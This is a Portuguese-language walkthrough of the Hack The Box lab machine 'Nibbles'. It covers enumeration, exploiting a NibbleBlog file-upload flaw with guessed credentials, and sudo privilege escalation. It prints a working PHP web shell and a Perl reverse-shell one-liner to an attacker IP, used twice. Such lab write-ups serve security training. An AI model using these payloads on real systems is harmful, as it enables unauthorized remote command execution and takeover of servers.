---
title: "Hack The Box - Nibbles"
tags: [Linux,Easy,Web,Metasploit]
categories: HackTheBox OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/121>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 2 portas abertas no servidor

> Porta 22 -> Servidor SSH, dificilmente a exploração vai ser por aqui

> Porta 80 -> Servidor Web.

## Enumeração da porta 80

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_web.png)

### Verificamos o código fonte da página

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_blog.png)

### Acessamos a página

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_blog1.png)

### Procuramos por exploits para Nibbleblog

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_exp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_exp1.png)

### Lendo o código do exploit encontramos esse site, pois não iremos utilizar Metasploit Framework agora

 > http://blog.curesec.com/article/blog/NibbleBlog-403-Code-Execution-47.html

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_exp2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_exp3.png)

# Exploração

## Verificamos como exploramos essa falha manualmente

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_exp4.png)

### Essa parte é meio na adivinhação, temos que descobrir o login e senha da aplicação

> admin:nibbles

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_login.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_login1.png)

### Vamos até `Plugins` - `My Images`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_exp5.png)

### Upamos nosso WebShell

```
<?php
echo "<form action='' method='post'>
   <input type='text' name='c' value='' size='60'/>
   <input type='submit' />
   </form>";
if (isset($_POST['c'])){
   if(function_exists('shell_exec')) {
   $c=$_POST['c'];
      echo "<pre>".shell_exec("$c")."</pre>";
   }
}
?>
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_shell.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_shell1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Niblles_shell2.png)

### Verificamos que conseguimos mesmo com os erros que deram

> nibbleblog/content/private/plugins/my_image/

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_shell2.png)

> perl -e 'use Socket;$i="10.10.16.119";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

### Pegamos um shell na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_shell3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_shell4.png)

# Escalação de privilégio

### Verificamos o `sudo -l`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_shell5.png)

#### Verificamos que podemos rodar o monitor.sh como root sem ser root

#### Então, criamos um `monitor.sh` pra nos dar um reverse shell

> perl -e 'use Socket;$i="10.10.16.119";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_shell6.png)

### Executamos e ganhamos root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_shell7.png)

## Pegamos a flag de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_user.png)

# Agora vamos explorar com o Metasploit Framework

### Pesquisamos pelo exploit no msfconsole

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_msf.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_msf1.png)

### Exploramos e ganhamos ums shell, a partir dai é a mesma coisa que já foi explicado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_msf2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nibbles/Nibbles_msf3.png)